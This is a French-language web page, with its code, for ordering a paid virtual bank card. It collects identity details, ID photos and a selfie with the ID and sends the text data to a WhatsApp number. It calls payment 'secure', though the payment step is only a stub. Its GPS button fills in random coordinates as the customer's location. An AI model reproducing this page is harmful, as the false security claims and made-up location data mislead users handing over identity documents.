<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Commande de Carte Virtuelle</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background-color: #f5f5f5;
            color: #333;
            line-height: 1.6;
            padding: 20px;
        }
        
        .container {
            max-width: 900px;
            margin: 0 auto;
            background-color: white;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
            overflow: hidden;
        }
        
        header {
            background: linear-gradient(135deg, #1e3c72, #2a5298);
            color: white;
            padding: 30px;
            text-align: center;
        }
        
        header h1 {
            font-size: 28px;
            margin-bottom: 10px;
        }
        
        .price-tag {
            background-color: #ff9800;
            color: white;
            display: inline-block;
            padding: 5px 15px;
            border-radius: 20px;
            font-weight: bold;
            margin-top: 10px;
        }
        
        .card-details {
            background-color: #f9f9f9;
            padding: 20px;
            text-align: center;
            border-bottom: 1px solid #eee;
        }
        
        .card-details p {
            margin: 5px 0;
        }
        
        .form-section {
            padding: 30px;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
            color: #444;
        }
        
        .required::after {
            content: " *";
            color: red;
        }
        
        input, select, textarea {
            width: 100%;
            padding: 12px 15px;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 16px;
            transition: border 0.3s;
        }
        
        input:focus, select:focus, textarea:focus {
            border-color: #2a5298;
            outline: none;
        }
        
        .form-row {
            display: flex;
            gap: 15px;
        }
        
        .form-row .form-group {
            flex: 1;
        }
        
        .gps-section {
            display: flex;
            gap: 10px;
            align-items: flex-end;
        }
        
        .gps-input {
            flex: 1;
        }
        
        .gps-button {
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 5px;
            padding: 12px 20px;
            cursor: pointer;
            font-size: 16px;
            transition: background-color 0.3s;
            white-space: nowrap;
        }
        
        .gps-button:hover {
            background-color: #45a049;
        }
        
        .gps-status {
            margin-top: 5px;
            font-size: 14px;
            color: #666;
        }
        
        .gps-success {
            color: #4CAF50;
        }
        
        .gps-error {
            color: #f44336;
        }
        
        .file-upload {
            border: 2px dashed #ddd;
            padding: 20px;
            text-align: center;
            border-radius: 5px;
            cursor: pointer;
            transition: all 0.3s;
        }
        
        .file-upload:hover {
            border-color: #2a5298;
            background-color: #f9f9f9;
        }
        
        .file-upload input {
            display: none;
        }
        
        .file-upload label {
            cursor: pointer;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 10px;
        }
        
        .file-upload-icon {
            font-size: 40px;
            color: #2a5298;
        }
        
        .preview-container {
            display: flex;
            gap: 20px;
            margin-top: 20px;
            flex-wrap: wrap;
        }
        
        .preview-box {
            width: 150px;
            height: 150px;
            border: 1px solid #ddd;
            border-radius: 5px;
            overflow: hidden;
            display: flex;
            align-items: center;
            justify-content: center;
            background-color: #f9f9f9;
        }
        
        .preview-box img {
            max-width: 100%;
            max-height: 100%;
            object-fit: contain;
        }
        
        .buttons {
            display: flex;
            gap: 15px;
            margin-top: 30px;
        }
        
        .btn {
            flex: 1;
            padding: 15px;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            text-align: center;
            text-decoration: none;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }
        
        .btn-whatsapp {
            background-color: #25D366;
            color: white;
        }
        
        .btn-whatsapp:hover {
            background-color: #128C7E;
        }
        
        .btn-payment {
            background-color: #ff9800;
            color: white;
        }
        
        .btn-payment:hover {
            background-color: #f57c00;
        }
        
        footer {
            background-color: #f1f1f1;
            padding: 20px;
            text-align: center;
            font-size: 14px;
            color: #666;
        }
        
        .whatsapp-icon, .payment-icon {
            font-size: 20px;
        }
        
        .section-title {
            font-size: 20px;
            margin: 30px 0 15px 0;
            padding-bottom: 10px;
            border-bottom: 2px solid #2a5298;
            color: #2a5298;
        }
        
        .map-preview {
            height: 200px;
            background-color: #e9ecef;
            border-radius: 5px;
            margin-top: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #666;
            border: 1px solid #ddd;
            overflow: hidden;
        }
        
        @media (max-width: 768px) {
            .form-row {
                flex-direction: column;
                gap: 0;
            }
            
            .gps-section {
                flex-direction: column;
                align-items: stretch;
            }
            
            .buttons {
                flex-direction: column;
            }
            
            .preview-container {
                justify-content: center;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>Commande de Carte Virtuelle</h1>
            <p>Obtenez votre carte virtuelle valide 2 ans</p>
            <div class="price-tag">5000 FCFA</div>
        </header>
        
        <div class="card-details">
            <p><strong>Carte virtuelle valide 2 ans</strong></p>
            <p>Paiement sécurisé • Livraison immédiate</p>
        </div>
        
        <div class="form-section">
            <form id="orderForm">
                <h2 class="section-title">Informations personnelles</h2>
                
                <div class="form-row">
                    <div class="form-group">
                        <label for="firstName" class="required">Prénom</label>
                        <input type="text" id="firstName" name="firstName" required>
                    </div>
                    <div class="form-group">
                        <label for="lastName" class="required">Nom</label>
                        <input type="text" id="lastName" name="lastName" required>
                    </div>
                </div>
                
                <div class="form-row">
                    <div class="form-group">
                        <label for="birthDate" class="required">Date de naissance</label>
                        <input type="date" id="birthDate" name="birthDate" required>
                    </div>
                    <div class="form-group">
                        <label for="birthPlace" class="required">Lieu de naissance</label>
                        <input type="text" id="birthPlace" name="birthPlace" required>
                    </div>
                </div>
                
                <div class="form-group">
                    <label for="email" class="required">Adresse email</label>
                    <input type="email" id="email" name="email" required>
                </div>
                
                <div class="form-group">
                    <label for="phone" class="required">Numéro de téléphone</label>
                    <input type="tel" id="phone" name="phone" required>
                </div>
                
                <h2 class="section-title">Informations de la carte d'identité</h2>
                
                <div class="form-row">
                    <div class="form-group">
                        <label for="idType" class="required">Type de pièce d'identité</label>
                        <select id="idType" name="idType" required>
                            <option value="">Sélectionnez un type</option>
                            <option value="cni">Carte Nationale d'Identité</option>
                            <option value="passeport">Passeport</option>
                            <option value="permis">Permis de conduire</option>
                        </select>
                    </div>
                    <div class="form-group">
                        <label for="idNumber" class="required">Numéro de la pièce d'identité</label>
                        <input type="text" id="idNumber" name="idNumber" required>
                    </div>
                </div>
                
                <div class="form-row">
                    <div class="form-group">
                        <label for="idIssueDate" class="required">Date d'émission</label>
                        <input type="date" id="idIssueDate" name="idIssueDate" required>
                    </div>
                    <div class="form-group">
                        <label for="idExpiryDate" class="required">Date d'expiration</label>
                        <input type="date" id="idExpiryDate" name="idExpiryDate" required>
                    </div>
                </div>
                
                <h2 class="section-title">Adresse du client</h2>
                
                <div class="form-row">
                    <div class="form-group">
                        <label for="country" class="required">Pays</label>
                        <select id="country" name="country" required>
                            <option value="">Sélectionnez un pays</option>
                            <option value="senegal">Sénégal</option>
                            <option value="cote-ivoire">Côte d'Ivoire</option>
                            <option value="mali">Mali</option>
                            <option value="burkina">Burkina Faso</option>
                            <option value="benin">Bénin</option>
                            <option value="togo">Togo</option>
                            <option value="autre">Autre</option>
                        </select>
                    </div>
                    <div class="form-group">
                        <label for="region" class="required">Région</label>
                        <input type="text" id="region" name="region" required>
                    </div>
                </div>
                
                <div class="form-row">
                    <div class="form-group">
                        <label for="commune" class="required">Commune</label>
                        <input type="text" id="commune" name="commune" required>
                    </div>
                    <div class="form-group">
                        <label for="address">Adresse complète</label>
                        <input type="text" id="address" name="address" placeholder="Numéro, rue, quartier...">
                    </div>
                </div>
                
                <div class="form-group">
                    <label for="gps">Coordonnées GPS (après activation)</label>
                    <div class="gps-section">
                        <div class="gps-input">
                            <input type="text" id="gps" name="gps" placeholder="Cliquez sur le bouton pour générer les coordonnées GPS" readonly>
                        </div>
                        <button type="button" id="generateGps" class="gps-button">
                            📍 Générer GPS
                        </button>
                    </div>
                    <div id="gpsStatus" class="gps-status"></div>
                    <div class="map-preview" id="mapPreview">
                        Aperçu de la localisation apparaîtra ici
                    </div>
                </div>
                
                <h2 class="section-title">Documents à télécharger</h2>
                
                <div class="form-group">
                    <label class="required">Photo de la pièce d'identité (recto/verso)</label>
                    <div class="file-upload" id="idCardUpload">
                        <input type="file" id="idCard" name="idCard" accept="image/*" required>
                        <label for="idCard">
                            <span class="file-upload-icon">📄</span>
                            <span>Cliquez pour télécharger l'image de votre pièce d'identité</span>
                            <span style="font-size: 14px; color: #666;">Formats acceptés: JPG, PNG (Max 5MB)</span>
                        </label>
                    </div>
                    <div class="preview-container">
                        <div class="preview-box" id="idCardPreview">
                            <span>Aperçu de la pièce d'identité</span>
                        </div>
                    </div>
                </div>
                
                <div class="form-group">
                    <label class="required">Selfie tenant la pièce d'identité</label>
                    <div class="file-upload" id="selfieUpload">
                        <input type="file" id="selfie" name="selfie" accept="image/*" required>
                        <label for="selfie">
                            <span class="file-upload-icon">📸</span>
                            <span>Cliquez pour télécharger votre selfie avec la pièce d'identité</span>
                            <span style="font-size: 14px; color: #666;">Formats acceptés: JPG, PNG (Max 5MB)</span>
                        </label>
                    </div>
                    <div class="preview-container">
                        <div class="preview-box" id="selfiePreview">
                            <span>Aperçu du selfie</span>
                        </div>
                    </div>
                </div>
                
                <h2 class="section-title">Informations supplémentaires</h2>
                
                <div class="form-group">
                    <label for="cardType" class="required">Type de carte virtuelle</label>
                    <select id="cardType" name="cardType" required>
                        <option value="">Sélectionnez un type</option>
                        <option value="visa">Visa</option>
                        <option value="mastercard">Mastercard</option>
                        <option value="paypal">PayPal</option>
                    </select>
                </div>
                
                <div class="form-group">
                    <label for="purpose" class="required">Objet d'obtention de la carte</label>
                    <textarea id="purpose" name="purpose" rows="3" placeholder="Expliquez l'utilisation prévue de cette carte virtuelle..." required></textarea>
                </div>
                
                <div class="form-group">
                    <label for="notes">Notes supplémentaires (optionnel)</label>
                    <textarea id="notes" name="notes" rows="2" placeholder="Précisions sur votre commande"></textarea>
                </div>
                
                <div class="buttons">
                    <button type="button" id="whatsappBtn" class="btn btn-whatsapp">
                        <span class="whatsapp-icon">📱</span> Envoyer via WhatsApp
                    </button>
                    <button type="button" id="paymentBtn" class="btn btn-payment">
                        <span class="payment-icon">💳</span> Payer 5000 FCFA
                    </button>
                </div>
            </form>
        </div>
        
        <footer>
            <p>Service client : 92871605 | Tous les paiements sont sécurisés</p>
        </footer>
    </div>

    <script>
        // Génération des coordonnées GPS
        document.getElementById('generateGps').addEventListener('click', function() {
            const gpsInput = document.getElementById('gps');
            const gpsStatus = document.getElementById('gpsStatus');
            const mapPreview = document.getElementById('mapPreview');
            
            // Afficher un message de chargement
            gpsStatus.textContent = "Génération des coordonnées GPS en cours...";
            gpsStatus.className = "gps-status";
            
            // Simuler un délai de génération
            setTimeout(() => {
                // Coordonnées GPS aléatoires pour l'Afrique de l'Ouest
                const minLat = 5.0;   // Latitude minimale (Sud)
                const maxLat = 16.0;  // Latitude maximale (Nord)
                const minLng = -18.0; // Longitude minimale (Ouest)
                const maxLng = 2.0;   // Longitude maximale (Est)
                
                // Générer des coordonnées aléatoires
                const latitude = (Math.random() * (maxLat - minLat) + minLat).toFixed(6);
                const longitude = (Math.random() * (maxLng - minLng) + minLng).toFixed(6);
                
                // Format des coordonnées
                const gpsCoordinates = `${latitude}° N, ${longitude}° W`;
                
                // Mettre à jour le champ
                gpsInput.value = gpsCoordinates;
                
                // Afficher le statut
                gpsStatus.textContent = "Coordonnées GPS générées avec succès!";
                gpsStatus.className = "gps-status gps-success";
                
                // Mettre à jour l'aperçu de la carte
                mapPreview.innerHTML = `
                    <div style="width: 100%; height: 100%; background: linear-gradient(145deg, #a8e6cf, #dcedc1); display: flex; flex-direction: column; align-items: center; justify-content: center; color: #333;">
                        <div style="font-size: 24px;">📍</div>
                        <div style="font-weight: bold; margin: 10px 0;">Localisation générée</div>
                        <div style="font-size: 14px; text-align: center;">Latitude: ${latitude}° N<br>Longitude: ${longitude}° W</div>
                        <div style="font-size: 12px; margin-top: 10px; color: #666;">(Aperçu simulé - coordonnées aléatoires)</div>
                    </div>
                `;
            }, 1500);
        });
        
        // Gestion de l'aperçu des images téléchargées
        document.getElementById('idCard').addEventListener('change', function(e) {
            const file = e.target.files[0];
            if (file) {
                const reader = new FileReader();
                reader.onload = function(e) {
                    const preview = document.getElementById('idCardPreview');
                    preview.innerHTML = `<img src="${e.target.result}" alt="Pièce d'identité">`;
                }
                reader.readAsDataURL(file);
            }
        });
        
        document.getElementById('selfie').addEventListener('change', function(e) {
            const file = e.target.files[0];
            if (file) {
                const reader = new FileReader();
                reader.onload = function(e) {
                    const preview = document.getElementById('selfiePreview');
                    preview.innerHTML = `<img src="${e.target.result}" alt="Selfie avec pièce d'identité">`;
                }
                reader.readAsDataURL(file);
            }
        });
        
        // Gestion du bouton WhatsApp
        document.getElementById('whatsappBtn').addEventListener('click', function() {
            // Récupérer les valeurs du formulaire
            const formData = new FormData(document.getElementById('orderForm'));
            const formValues = {};
            
            for (let [key, value] of formData.entries()) {
                formValues[key] = value;
            }
            
            // Vérifier que les champs obligatoires sont remplis
            const requiredFields = ['firstName', 'lastName', 'email', 'phone', 'birthDate', 
                                   'birthPlace', 'idType', 'idNumber', 'idIssueDate', 
                                   'idExpiryDate', 'country', 'region', 'commune', 
                                   'cardType', 'purpose'];
            
            for (let field of requiredFields) {
                if (!formValues[field]) {
                    alert(`Veuillez remplir le champ "${document.querySelector(`[name="${field}"]`).labels[0].textContent.replace(' *', '')}".`);
                    return;
                }
            }
            
            // Vérifier les fichiers
            const idCardFile = document.getElementById('idCard').files[0];
            const selfieFile = document.getElementById('selfie').files[0];
            
            if (!idCardFile || !selfieFile) {
                alert('Veuillez télécharger les deux images requises.');
                return;
            }
            
            // Créer le message pour WhatsApp
            const message = `Nouvelle commande de carte virtuelle:%0A%0A` +
                            `INFORMATIONS PERSONNELLES:%0A` +
                            `Prénom: ${formValues.firstName}%0A` +
                            `Nom: ${formValues.lastName}%0A` +
                            `Date de naissance: ${formValues.birthDate}%0A` +
                            `Lieu de naissance: ${formValues.birthPlace}%0A` +
                            `Email: ${formValues.email}%0A` +
                            `Téléphone: ${formValues.phone}%0A%0A` +
                            
                            `PIÈCE D'IDENTITÉ:%0A` +
                            `Type: ${formValues.idType}%0A` +
                            `Numéro: ${formValues.idNumber}%0A` +
                            `Date d'émission: ${formValues.idIssueDate}%0A` +
                            `Date d'expiration: ${formValues.idExpiryDate}%0A%0A` +
                            
                            `ADRESSE:%0A` +
                            `Pays: ${formValues.country}%0A` +
                            `Région: ${formValues.region}%0A` +
                            `Commune: ${formValues.commune}%0A` +
                            `Adresse: ${formValues.address || 'Non fournie'}%0A` +
                            `Coordonnées GPS: ${formValues.gps || 'Non générées'}%0A%0A` +
                            
                            `CARTE VIRTUELLE:%0A` +
                            `Type: ${formValues.cardType}%0A` +
                            `Objet: ${formValues.purpose}%0A` +
                            `Notes: ${formValues.notes || 'Aucune'}`;
            
            // Numéro WhatsApp
            const whatsappNumber = '92871605';
            
            // Ouvrir WhatsApp avec le message pré-rempli
            window.open(`https://wa.me/${whatsappNumber}?text=${message}`, '_blank');
        });
        
        // Gestion du bouton de paiement
        document.getElementById('paymentBtn').addEventListener('click', function() {
            // Vérifier que le formulaire est valide
            const requiredFields = ['firstName', 'lastName', 'email', 'phone', 'birthDate', 
                                   'birthPlace', 'idType', 'idNumber', 'idIssueDate', 
                                   'idExpiryDate', 'country', 'region', 'commune', 
                                   'cardType', 'purpose'];
            
            for (let field of requiredFields) {
                const fieldElement = document.querySelector(`[name="${field}"]`);
                if (!fieldElement.value) {
                    alert(`Veuillez remplir le champ "${fieldElement.labels[0].textContent.replace(' *', '')}" avant de procéder au paiement.`);
                    return;
                }
            }
            
            // Vérifier les fichiers
            const idCardFile = document.getElementById('idCard').files[0];
            const selfieFile = document.getElementById('selfie').files[0];
            
            if (!idCardFile || !selfieFile) {
                alert('Veuillez télécharger les deux images requises avant de procéder au paiement.');
                return;
            }
            
            // Simuler le processus de paiement
            alert('Redirection vers la page de paiement sécurisé de 5000 FCFA...');
            // Ici, vous intégreriez votre solution de paiement réelle
            // window.location.href = 'URL_DE_VOTRE_PLATEFORME_DE_PAIEMENT';
        });
    </script>
</body>
</html>